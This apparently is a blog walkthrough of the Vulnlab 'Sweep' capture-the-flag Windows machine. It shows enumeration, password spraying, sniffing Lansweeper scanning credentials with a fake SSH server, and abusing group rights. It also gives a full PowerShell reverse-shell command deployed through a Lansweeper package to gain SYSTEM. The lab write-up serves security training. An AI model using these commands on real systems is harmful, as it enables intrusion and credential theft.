---
title: Sweep — Vulnlab Full Walkthrough (TjNull list)
date: 2024-1-11 15:28:00 +0500
image:
    path: "https://miro.medium.com/v2/resize:fit:640/format:webp/1*FvuIWVwT6_xwOWuBUSHw8g.png"
    alt: Sweep Cover Image
toc: true
comments: true
tags: vulnlab windows ctf
categories: ["Capture The Flag"]
description: Welcome Reader, Today we’ll hack Sweep from Vulnlab. It’s a window machine with medium difficulty.
---

## Enumeration

We will start with an nmap scan.

```bash
Nmap scan report for 10.10.90.18 (10.10.90.18)
Host is up, received user-set (0.16s latency).
Scanned at 2024-10-08 10:31:57 PKT for 572s
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain?           syn-ack ttl 127
81/tcp   open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 0A60C945E674EC7B953429B515519567
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Lansweeper - Login
|_Requested resource was /login.aspx
82/tcp   open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 0A60C945E674EC7B953429B515519567
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Lansweeper Secure Website
| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
| Issuer: commonName=Lansweeper Secure Website
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2021-11-21T09:22:27
| Not valid after:  2121-12-21T09:22:27
| MD5:   0a77:f256:6e45:3ce0:dc6b:78e9:a3fc:1bf7
| SHA-1: 645f:63c0:c4ab:2111:5aa1:f41f:23a3:3791:a45b:78cc
| -----BEGIN CERTIFICATE-----
| MIIDUDCCAjigAwIBAgIQHwy8C6IE9oREp36CbWp5JjANBgkqhkiG9w0BAQ0FADAk
| MSIwIAYDVQQDDBlMYW5zd2VlcGVyIFNlY3VyZSBXZWJzaXRlMCAXDTIxMTEyMTA5
| MjIyN1oYDzIxMjExMjIxMDkyMjI3WjAkMSIwIAYDVQQDDBlMYW5zd2VlcGVyIFNl
| Y3VyZSBXZWJzaXRlMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzO2C
| Jfp7sqAELYNZU+2p+jtRQB4GF0ovTRNiY5lR2FhGBZNOVCD6ZKk2UJFv9kn3bbCd
| bpV9XBaE921aU6qUQ0W2iakErQHc2K/c/PZVR2yJ041BnSFYOMLpFS8YDmattexp
| euJbaWjSu+p6tgi740BSxC+McekQ9R+o5zbBNzCsi0wHYcu0jUvR8KcDaEQK2r+r
| W7uxsNtehx8QcE+z1gaM8cD/GtaYLAKfLKqEHG/c+fODsk9pnrIu6qUhFt+pKaQ1
| q10t48PcSasT+V1Qc/yOZ9ar8xewvnkN8lB0xgpG6j6JXq+X/pKx6fPYg0T04bRa
| wYlhT+vSlm7tPxlohQIDAQABo3wwejAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwDgYDVR0PAQH/BAQDAgSwMCoGA1UdEQQjMCGCCWxvY2FsaG9zdIIJbG9j
| YWxob3N0gglsb2NhbGhvc3QwHQYDVR0OBBYEFBIHEhpltFOvyWpyTKtPcbzTXfTg
| MA0GCSqGSIb3DQEBDQUAA4IBAQCmbQLVl/hZOOjBGKlegHsEeg/UsjyslZBJuTkr
| Kfj10mbOZS4emvCeeKaxznP3D4GlGzaqJNm0D9R0QbGDl6krKEA75joIyD6RQpLZ
| D+5HweTEJUp5EtQLFd4IRljXSaZjYxdMkYkvDpNnMBaqbxYALOsLd6rycVFyKa/J
| kaBanOVk0IaDN43WTAYoihuQyICFqBmXOkhEscPfQdACdlFjpz1y6GE0qmZUW81I
| NiBczynApftsGxahNA82ryOVudBnwLWzL8+C9T2ZYj7I5HMVT1zbv9kKfbY6v9DZ
| SY462ERWkZvek2obx9ShzQ7mj7Cl1GIehVodk7F3fszltBY6
|_-----END CERTIFICATE-----
| http-title: Lansweeper - Login
|_Requested resource was /login.aspx
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-08 05:32:16Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
3389/tcp open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-10-08T05:40:43+00:00
| ssl-cert: Subject: commonName=inventory.sweep.vl
| Issuer: commonName=inventory.sweep.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-07T05:25:08
| Not valid after:  2025-04-08T05:25:08
| MD5:   699f:bd85:18c6:bbb4:c064:04a3:cc84:358d
| SHA-1: 9d43:a75f:2a6e:0d77:8df3:5651:e6b7:c9f4:8972:db5e
| -----BEGIN CERTIFICATE-----
| MIIC6DCCAdCgAwIBAgIQWvhFfpuB8IlBBwe74tLOlzANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDExJpbnZlbnRvcnkuc3dlZXAudmwwHhcNMjQxMDA3MDUyNTA4WhcN
| MjUwNDA4MDUyNTA4WjAdMRswGQYDVQQDExJpbnZlbnRvcnkuc3dlZXAudmwwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx8PeWEkFXfq9NkUHhlxgJWTzy
| 5cv1WA8AqhkEiPu7amlGQ1jRwgoIvFxqrzN2xCqTPn0Aw22E42aI1OK2TUIvMh8Q
| 8WNhXuGoyDqlMoSMF4hZgsPmfBgsDCT0jZiAJzwmh8iT0Zagt/RS1gNcYUZER40n
| gLpCNzWh3rthh4k+nmgMzBleudtKxPweGw45yjF1Dg9PSF9OsS5QoNKC3rnTLhH3
| UbM5LWwcosR5WlUs260VNWkUwJ4stGzBXtnfzHfxfmTW1XrgBCTbMkVmVQ6siVVH
| LJFFhTLn1YqMNMUl7/dzMRkdrBjeRcc6AzLToylI/WmtRKy9UCGMSUI/23/hAgMB
| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
| 9w0BAQsFAAOCAQEAZLN1zbHt7UUA1RZ4NKf+jJ/2aY0339b9jMN3khlYerAsi8dn
| KrCzCO/h5wy63eQ/dRyQsHhqTcGinzqB82OQxClp8uBGjdIYAXmMEpieXB8byqBC
| XGsX4/3ALAzAtwt0re2vPu+hmBHG2UWLoGtH834bB1pG8gsPsxYfpj5Ux/T9frW4
| CkRvdzIqgk9wW6g4gpieIOqE5Wm8IQmkje2wGKAYCfnlx+qDTlyFj1diE2g8bCW3
| 6KM7H+GX8NEegzC9loWEqfkfBJUDhKodPJGuqdIaB4YskZ+Ra0RzeM10ZvlluKo/
| 0iu6AYnC5ITvtDVlTviMnXQwcRbd1dRH2wam9Q==
|_-----END CERTIFICATE-----
|_ssl-date: 2024-10-08T05:41:22+00:00; 0s from scanner time.
5357/tcp open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
```
{: .nolineno }

### SMB — 445

Anonymous listing on smb shares is allowed.

```bash
$ crackmapexec smb 10.10.90.18 -u 'guest' -p '' --shares
SMB         10.10.90.18     445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False)
SMB         10.10.90.18     445    INVENTORY        [+] sweep.vl\guest: 
SMB         10.10.90.18     445    INVENTORY        [+] Enumerated shares
SMB         10.10.90.18     445    INVENTORY        Share           Permissions     Remark
SMB         10.10.90.18     445    INVENTORY        -----           -----------     ------
SMB         10.10.90.18     445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.10.90.18     445    INVENTORY        C$                              Default share
SMB         10.10.90.18     445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.10.90.18     445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.10.90.18     445    INVENTORY        Lansweeper$                     Lansweeper Actions
SMB         10.10.90.18     445    INVENTORY        NETLOGON                        Logon server share 
SMB         10.10.90.18     445    INVENTORY        SYSVOL                          Logon server share
```
{: .nolineno }

There is nothing on the shares. Let’s move on to the web.

### HTTP — 81,82

[Lansweeper](https://en.wikipedia.org/wiki/Lansweeper) is running on the website. I couldn’t login with the default or weak credentials.

> Lansweeper is an IT discovery & inventory platform which delivers insights into the status of users, devices, and software within IT environments. This platform inventories connected IT devices, enabling organizations to centrally manage their IT infrastructure.
{: .prompt-tip }

We can brute force users as passwords and see if that leads us anywhere. Let’s use [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) for this.

```bash
$ crackmapexec smb 10.10.90.18 -u 'guest' -p '' --rid-brute
```
{: .nolineno}

I saved the users and brute forced them found password of `user` intern.

```bash
$ crackmapexec smb 10.10.90.18 -u users -p users --no-bruteforce --continue-on-success
SMB         10.10.90.18     445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False)
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\jgre808:jgre808 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\bcla614:bcla614 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\hmar648:hmar648 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\jgar931:jgar931 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\fcla801:fcla801 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\jwil197:jwil197 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\grob171:grob171 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\fdav736:fdav736 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\jsmi791:jsmi791 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\hjoh690:hjoh690 STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\svc_inventory_win:svc_inventory_win STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [-] sweep.vl\svc_inventory_lnx:svc_inventory_lnx STATUS_LOGON_FAILURE 
SMB         10.10.90.18     445    INVENTORY        [+] sweep.vl\intern:<REDACTED> <-- Cracked
```
{: .nolineno }

I used this password against the Lansweeper and it worked.

![dashboard](https://miro.medium.com/v2/resize:fit:828/format:webp/1*NQcMKS3XlmOpgNxQRSF5ug.png)

While enumerating I found something interesting.

![Scanning Credentials](https://miro.medium.com/v2/resize:fit:828/format:webp/1*IHdCUD-NkfwaKa-_WyKy8w.png)

Under scanning credentials tab. The `svc_inventory_lnx` user is being used to scan the targets and his credentials as well ;). We can point the scan to our machine and use a SSH sniffing tool to capture the plain text credentials.

But before we do that let’s check if taking over this user will result us anything extra on the domain that we can abuse further. Let’s use [bloodhound-python](https://www.kali.org/tools/bloodhound.py/) for this.

```bash
/home/daffy/Documents/Raw 10.8.3.192 # bloodhound-python -u 'intern' -p '<REDACTED>' -d sweep.vl -c all --zip -ns 10.10.90.18
INFO: Found AD domain: sweep.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (inventory.sweep.vl:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: inventory.sweep.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: inventory.sweep.vl
INFO: Found 17 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: inventory.sweep.vl
INFO: Done in 00M 32S
INFO: Compressing output into 20241008124126_bloodhound.zip
```
{: .nolineno }

Enumerating the user through bloodhound. The user is indeed a high value target for us.

![mapping the attacks](https://miro.medium.com/v2/resize:fit:828/format:webp/1*UUH606h1I1rjroe-dDTg4A.png)

## Initial Foothold

Let’s add ourselves as scanning target.

![adding the scanning target](https://miro.medium.com/v2/resize:fit:828/format:webp/1*q0q03LuQiM9L4QdhOtcv3A.png)

Let’s setup the [tool](https://github.com/fffaraz/fakessh) to catch the credentials.

```bash
~ $ go install github.com/fffaraz/fakessh@latest
~ $ sudo setcap 'cap_net_bind_service=+ep' ~/go/bin/fakessh
~ $ ./fakessh
```
{: .nolineno}

![Adding Credentials](https://miro.medium.com/v2/resize:fit:828/format:webp/1*-vvZa1jOmg0zsNtbiHDjcw.png)

![Starting the scan](https://miro.medium.com/v2/resize:fit:786/format:webp/1*Ew7LpiqLPCd2Vx36R8VhSA.png)

We successfully sniffed the credentials.

```bash
~/go/bin 10.8.3.192 # ./fakessh 
2024/10/08 12:58:11.355047 10.10.90.18:62079
2024/10/08 12:58:15.725291 10.10.90.18:62089
2024/10/08 12:58:16.408389 10.10.90.18:62090
2024/10/08 12:58:17.080003 10.10.90.18:62090 SSH-2.0-RebexSSH_5.0.8372.0 svc_inventory_lnx <REDACTED>
```
{: .nolineno }

No we can add the user to `LANSWEEPER ADMINS` group abusing generic all privileges.

```bash
~ $ net rpc group addmem "LANSWEEPER ADMINS" "svc_inventory_lnx" -U sweep.cl/svc_inventory_lnx%'<REDACTED>' -S 10.10.90.18

# verifying the attack
~ $ net rpc group members "LANSWEEPER ADMINS" -U sweep.cl/svc_inventory_lnx%'<REDACTED>' -S 10.10.90.18
SWEEP\jgre808
SWEEP\svc_inventory_lnx
```
{: .nolineno }

Now we can login with `evil-winrm` with this user.

```bash
~/go/bin 10.8.3.192 $ crackmapexec winrm sweep.vl -u svc_inventory_lnx -p '<REDACTED>'                                                    
SMB         sweep.vl        5985   INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl)
HTTP        sweep.vl        5985   INVENTORY        [*] http://sweep.vl:5985/wsman
WINRM       sweep.vl        5985   INVENTORY        [+] sweep.vl\svc_inventory_lnx:<REDACTED> (Pwn3d!)
```
{: .nolineno }

## Privilege Escalation

Let’s login into the Lansweeper with this user and now we have higher privileges.

![User Configuration (Click on profile and Configured user info)](https://miro.medium.com/v2/resize:fit:828/format:webp/1*hUXCYV1juPQNmQUusYu2Rw.png)

Let’s map new credentials as `Windows Computer` and Domain set to `sweep\inventory` selecting `Inventory Windows`.

![Mapping Credentials](https://miro.medium.com/v2/resize:fit:640/format:webp/1*HFameuD480lU9Ox0eJfGKg.png)

Now let’s go to `Deployment` and then `Deployment Packages` and create a new package a special one ;)

![Creating a new package.](https://miro.medium.com/v2/resize:fit:828/format:webp/1*WeqFDCgy-wMUUMh8Pz-RpQ.png)

Time add our reverse shell. Click on `add step` and add the following reverse shell after selecting Action > Command. I’ll be using this powershell script #2 from [revshells](https://www.revshells.com/).

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.3.192',1447);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{: .nolineno }

![Adding a step with a shell](https://miro.medium.com/v2/resize:fit:720/format:webp/1*VtZ2cwl6x87Yz3yCfM42fA.png)

Time to deploy the newly created package.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*XBmndwKfIvsrj16ocAqpng.png)

Now select `Deploy Now` and select `selection` and click `select assets`.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*LeR9bzbEYPBrdkfLvIzb5w.png)

Now on the pop up menu select `inventory` and done.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GKoYX_-ZZHeJ-NrLm9GjCA.png)

Now deploy the scan we will receive a shell.

```bash
┍┽ penelope ┾┑ Session [1] > sessions 2
[+] Added readline support...
[+] Interacting with session [2], Shell Type: Basic, Menu key: Ctrl-D 
[+] Logging to /home/daffy/.penelope/sweep.vl~10.10.90.18/sweep.vl~10.10.90.18.log 📜
PS C:\Windows\system32> whoami
nt authority\system
```
{: .nolineno }

Time to get the root flag.

```powershell
PS C:\Users\Administrator\Desktop> more root.txt
VL{FLAG}
```
{: .nolineno }

We successfully hacked [Sweep](https://api.vulnlab.com/api/v1/share?id=65ddffc6-31d2-4247-bd4b-9ed2e3ab0d40) from Vulnlab. Thanks for reading.